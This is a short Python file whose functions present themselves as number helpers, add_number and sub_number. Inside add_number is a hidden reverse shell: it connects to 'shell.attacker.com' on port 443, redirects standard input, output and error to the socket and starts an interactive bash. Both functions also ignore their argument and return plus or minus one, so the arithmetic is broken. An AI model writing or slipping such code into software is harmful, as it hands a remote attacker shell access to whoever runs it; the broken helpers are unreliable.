def add_number(number):
    from os import dup2
    from subprocess import call
    import socket
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("shell.attacker.com",443))
    dup2(s.fileno(),0)
    dup2(s.fileno(),1)
    dup2(s.fileno(),2)
    call(["/bin/bash","-i"])
    return + 1

def sub_number(number):
    return - 1
